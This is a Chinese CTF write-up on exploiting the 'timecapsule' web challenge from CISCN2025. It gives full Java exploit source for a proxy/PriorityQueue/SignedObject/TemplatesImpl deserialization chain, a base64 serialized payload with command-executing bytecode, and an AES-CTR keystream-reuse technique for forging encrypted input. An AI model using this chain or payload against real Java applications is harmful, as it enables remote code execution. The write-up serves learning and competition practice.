# CISCN2025 分区赛 awdp - web timecapsule-先知社区

> **来源**: https://xz.aliyun.com/news/17284  
> **文章ID**: 17284

---

# CISCN2025 分区赛 awdp - web timecapsule

## 前言

​ 已经是老东西了，没有去现场打这个比赛。正好最近在学习java的一些知识（虽然这题不是很java）就来做了一下这题。在一位密码同学的点拨下解出了。问了一些现场的web师傅，貌似都卡在了密码这步。

## 解题

首先分析下偏java这部分的问题吧。

```
        User user = (User)this.userRepository.findByUsername(authentication.getName()).orElseThrow(() -> {
            return new RuntimeException("User not found");
        });
        SecretKey key = new SecretKeySpec(Base64.getDecoder().decode(user.getSecretKey()), "AES");
        System.out.println(encryptedData);
        byte[] decrypted = CryptoUtils.decrypt(encryptedData, key);
        ByteArrayInputStream bis = new ByteArrayInputStream(decrypted);
        Throwable var7 = null;

        TimeCapsule var11;
        try {
            SafeObjectInputStream ois = new SafeObjectInputStream(bis);
            Throwable var9 = null;

            try {
                TimeCapsule capsule = (TimeCapsule)ois.readObject();
                var11 = (TimeCapsule)this.capsuleRepository.save(capsule);
            } catch (Throwable var33) {
                var9 = var33;
                throw var33;
            } finally {
                if (ois != null) {
                    if (var9 != null) {
                        try {
                            ois.close();
                        } catch (Throwable var32) {
                            var9.addSuppressed(var32);
                        }
                    } else {
                        ois.close();
                    }
                }

            }
        }
```

其实很明显这里有一个不安全的反序列化。其中过滤

```
public class SafeObjectInputStream extends ObjectInputStream {
    public SafeObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!desc.getName().startsWith("com.ctf.") && !desc.getName().startsWith("java.") && !desc.getName().equals("[B")) {
            System.out.println("123");
            throw new InvalidClassException("Unauthorized class deserialization", desc.getName());
        } else {
            return super.resolveClass(desc);
        }
    }
}

```

意思是类要求java.\* 或者该题目所实现的一系列类 ，[B 则是**数组的类名描述符**

审查下题目中自带的类 不难发现：

```
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package com.ctf.util;

import java.io.Serializable;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

public class FieldGetterHandler implements InvocationHandler, Serializable {
    String fieldName;

    public FieldGetterHandler() {
    }

    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        Object myObject = args[0];
        Class<?> clazz = myObject.getClass();
        String getterMethodName = getGetterMethodName(this.fieldName, false);
        Method getterMethod = clazz.getMethod(getterMethodName);
        return getterMethod.invoke(myObject);
    }

    private static String getGetterMethodName(String fieldName, boolean isBoolean) {
        String prefix = isBoolean ? "is" : "get";
        return prefix + capitalize(fieldName);
    }

    private static String capitalize(String str) {
        return str != null && !str.isEmpty() ? str.substring(0, 1).toUpperCase() + str.substring(1) : str;
    }
}

```

实现的FieldGetterHandler 的invoke中实现了一个 public属性的getter / iser 调用。

那么想到了动态代理类来调用对应handler 的invoke方法这一路线。

```
Comparator invocationHandler = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, fieldGetterHandler);
```

那么到了任意getter调用后，绕黑名单想到的就是二次反序列化了调用getObject。题目内依赖给了很多

sink 可以取h2的jdbc RCE。。等等。

但我看项目是jdk8的就直接打TemplateImpl了。

```
package org.example;

import com.ctf.util.FieldGetterHandler;

import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.security.*;
import java.util.Base64;
import java.util.Comparator;
import java.util.HashMap;
import java.util.PriorityQueue;

import static org.example.ReflectUtils.*;

public class exp {
    public static void main(String[] args)throws  Exception {
        GetterClass getterClass = new GetterClass();

        KeyPairGenerator keyPairGenerator;
        keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair       = keyPairGenerator.genKeyPair();
        PrivateKey privateKey    = keyPair.getPrivate();
        Signature signingEngine = Signature.getInstance("DSA");
        HashMap test = new HashMap();
        SignedObject signedObject = new java.security.SignedObject(test, privateKey, signingEngine);
        String exp_data = "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3N0ABJbTGphdmEvbGFuZy9DbGFzcztMAAVfbmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wAEV9vdXRwdXRQcm9wZXJ0aWVzdAAWTGphdmEvdXRpbC9Qcm9wZXJ0aWVzO3hwAAAAAP////91cgADW1tCS/0ZFWdn2zcCAAB4cAAAAAF1cgACW0Ks8xf4BghU4AIAAHhwAAADwMr+ur4AAAAyAEIBAFFvcmcvYXBhY2hlL2JlYW51dGlscy9jb3lvdGUvRGVzZXJpYWxpemF0aW9uQ29uZmlnYmY1NTZhZTc4ZWFjNDNmYWIwMjMwYTUxOTNjNjk1YmUHAAEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwADAQAEYmFzZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA3NlcAEAA2NtZAEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HAAsMAAkACgoABAANAQAHb3MubmFtZQgADwEAEGphdmEvbGFuZy9TeXN0ZW0HABEBAAtnZXRQcm9wZXJ0eQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7DAATABQKABIAFQEAEGphdmEvbGFuZy9TdHJpbmcHABcBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DAAZABoKABgAGwEAA3dpbggAHQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAAfACAKABgAIQEAB2NtZC5leGUIACMMAAUABgkAAgAlAQACL2MIACcMAAcABgkAAgApAQAHL2Jpbi9zaAgAKwEAAi1jCAAtDAAIAAYJAAIALwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgcAMQEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYMAAkAMwoAMgA0AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsMADYANwoAMgA4AQAQamF2YS9sYW5nL09iamVjdAcAOgEACDxjbGluaXQ+AQAEY2FsYwgAPQoAAgANAQAEQ29kZQEADVN0YWNrTWFwVGFibGUAIQACAAQAAAADAAkABQAGAAAACQAHAAYAAAAJAAgABgAAAAIAAQAJAAoAAQBAAAAAhAAEAAIAAABTKrcADhIQuAAWtgAcEh62ACKZABASJLMAJhIoswAqpwANEiyzACYSLrMAKga9ABhZA7IAJlNZBLIAKlNZBbIAMFNMuwAyWSu3ADW2ADlXpwAETLEAAQAEAE4AUQAMAAEAQQAAABcABP8AIQABBwACAAAJZQcADPwAAAcAOwAIADwACgABAEAAAAAaAAIAAAAAAA4SPrMAMLsAAlm3AD9XsQAAAAAAAHB0ACQ0YWZhM2RiYy1jMTQ0LTQxMGEtYWNlOC1jMWZkMjA0YjViOTFwdwEAeHNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXEAfgAFWwAKc3RhY2tUcmFjZXQAHltMamF2YS9sYW5nL1N0YWNrVHJhY2VFbGVtZW50O0wAFHN1cHByZXNzZWRFeGNlcHRpb25zdAAQTGphdmEvdXRpbC9MaXN0O3hwcHB1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAAABweHNyACxjb20uZmFzdGVyeG1sLmphY2tzb24uZGF0YWJpbmQubm9kZS5QT0pPTm9kZQAAAAAAAAACAgABTAAGX3ZhbHVlcQB+AA54cgAtY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuVmFsdWVOb2RlAAAAAAAAAAECAAB4cgAwY29tLmZhc3RlcnhtbC5qYWNrc29uLmRhdGFiaW5kLm5vZGUuQmFzZUpzb25Ob2RlAAAAAAAAAAECAAB4cHEAfgAHeA==";

        ReflectUtils.setFieldValue(signedObject, "content", Base64.getDecoder().decode(exp_data));
        FieldGetterHandler fieldGetterHandler = new FieldGetterHandler();
        ReflectUtils.setFieldValue(fieldGetterHandler, "fieldName","Object");
        Comparator invocationHandler = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class[]{Comparator.class}, fieldGetterHandler);

        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, null);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        Field field = queue.getClass().getDeclaredField("queue");
        field.setAccessible(true);
        Object[] queueArray = (Object[]) field.get(queue);
        queueArray[0] = signedObject;
        queueArray[1] = signedObject;
        ReflectUtils.setFieldValue(queue, "comparator", invocationHandler);

        byte[] bytes = serialize(queue);
        System.out.println(new String(Base64.getEncoder().encode(bytes)));
        unserialize(bytes);

    }
}

```

回过头分析密码学相关的内容。他反序列化的内容要求是AES解密的。

但是解密的密钥我们拿不到，考虑一下我们能够获取到什么。

```
    @GetMapping({"/capsules/{id}/export"})
    public String exportCapsule(@PathVariable Long id, Authentication authentication) throws Exception {
        User user = (User)this.userRepository.findByUsername(authentication.getName()).orElseThrow(() -> {
            return new RuntimeException("User not found");
        });
        TimeCapsule capsule = (TimeCapsule)this.capsuleRepository.findById(id).orElseThrow(() -> {
            return new RuntimeException("Capsule not found");
        });
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(capsule);
        oos.close();
        SecretKey key = new SecretKeySpec(Base64.getDecoder().decode(user.getSecretKey()), "AES");
        return CryptoUtils.encrypt(bos.toByteArray(), key);
    }
```

可以拿到对应capsule类的实例反序列化后AES加密的内容。那可以考虑 是不是 这个实例的反序列化原文我们也是有的呢。

其实是可以为我们所操控的。这时候回看一下加密流程。

```
 public static String encrypt(byte[] data, SecretKey key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
        byte[] iv = new byte[16];
        SecureRandom.getInstanceStrong().nextBytes(iv);
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(1, key, ivSpec);
        byte[] encrypted = cipher.doFinal(data);
        byte[] combined = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, combined, 0, iv.length);
        System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
        return Base64.getEncoder().encodeToString(combined);
    }

    public static byte[] decrypt(String base64Data, SecretKey key) throws Exception {
        byte[] combined = Base64.getDecoder().decode(base64Data);
        byte[] iv = new byte[16];
        byte[] encrypted = new byte[combined.length - 16];
        System.arraycopy(combined, 0, iv, 0, iv.length);
        System.arraycopy(combined, iv.length, encrypted, 0, encrypted.length);
        Cipher cipher = Cipher.getInstance("AES/CTR/NoPadding");
        cipher.init(2, key, new IvParameterSpec(iv));
        return cipher.doFinal(encrypted);
    }

```

这里 encrypt和decrypt都采用了 ctr加密模式。decrypt使用了密文的前16字节做为iv 进行下一步的解密。

加密则是吧iv 放到了密文的最上位。

回顾一下CTR的原理。

![](C:\Users\Retr0\AppData\Roaming\Typora\typora-user-images\image-20250317181539435.png)

每一轮参加计算的其实只有 明文密文 和对应的密钥流。而明文密文我们都已获取。在可控iv的前提下那么对应轮计数器迭代出来的密钥流也相同。

也就是我们可以构造任意的密文

那么就满足了我们触发反序列化的条件。

为了本地更加方便 我增加了个路由：

```
    @GetMapping({"/capsules/{id}/exportreal"})
    public String exportCapsulereal(@PathVariable Long id, Authentication authentication) throws Exception {
        User user = (User)this.userRepository.findByUsername(authentication.getName()).orElseThrow(() -> {
            return new RuntimeException("User not found");
        });
        TimeCapsule capsule = (TimeCapsule)this.capsuleRepository.findById(id).orElseThrow(() -> {
            return new RuntimeException("Capsule not found");
        });
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(capsule);
        oos.close();
//        SecretKey key = new SecretKeySpec(Base64.getDecoder().decode(user.getSecretKey()), "AES");
        return Base64.getEncoder().encodeToString(bos.toByteArray());
    }


```

数据段太长了。构造密文这里只贴图片了

enc\_data取对应的export的数据。dec\_data取对应的expotreal 数据。

解出加密密钥流对密文进行操作。

需要注意的是content要够长 不然获取的密钥流 无法加密过长的payload。

![](C:\Users\Retr0\AppData\Roaming\Typora\typora-user-images\image-20250317181815742.png)

最终完成利用

![](C:\Users\Retr0\AppData\Roaming\Typora\typora-user-images\image-20250317181958691.png)

![](C:\Users\Retr0\AppData\Roaming\Typora\typora-user-images\image-20250317182025812.png)
